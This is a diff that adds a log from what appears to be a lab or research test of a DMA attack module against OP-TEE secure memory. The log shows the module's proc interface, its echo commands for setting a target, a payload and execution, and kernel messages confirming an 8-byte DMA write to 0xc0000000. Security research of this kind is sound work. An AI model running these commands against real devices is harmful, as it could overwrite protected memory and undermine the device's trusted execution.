@@ -1,0 +1,34 @@
+# cat /var/log/optee_attacks/attack_dma_attack_*.txt
+=== Attack Execution: dma_attack ===
+Timestamp: Thu Jan  1 02:04:57 UTC 1970
+Target Address: 0xc0000000
+Timeout: 60s
+Actual Duration: 60s
+
+=== Proc Interface Output ===
+DMA Attack Module Status
+========================
+Initialized: yes
+DMA Base: 00000000d2547f38
+Control Block: 0x383a000 (virt: 0000000054a10fb9)
+Payload Buffer: 0x1f6a000 (virt: 00000000bea66dda)
+Target Address: 0xc0000000
+Payload Size: 4096 bytes
+
+Commands:
+  echo "target=0xADDRESS" > /proc/dma_attack
+  echo "execute" > /proc/dma_attack
+  echo "payload=HEXBYTES" > /proc/dma_attack
+
+=== Kernel Messages ===
+[ 7437.189642] dma_attack: Target address set to 0xc0000000
+[ 7437.209480] [DMA_ATTACK] ========================================
+[ 7437.218243] [DMA_ATTACK] DMA Transfer Initiated
+[ 7437.225323] [DMA_ATTACK] Target Address: 0xc0000000
+[ 7437.232754] [DMA_ATTACK] Transfer Length: 8 bytes
+[ 7437.240023] [DMA_ATTACK] Source (Payload): 0x1f6a000
+[ 7437.247561] [DMA_ATTACK] Control Block configured
+[ 7437.254777] [DMA_ATTACK] Starting DMA transfer on channel 7...
+[ 7437.263105] [DMA_ATTACK] ✓ Transfer completed successfully
+[ 7437.271220] [DMA_ATTACK] Bytes transferred: 8
+[ 7437.277964] [DMA_ATTACK] ========================================
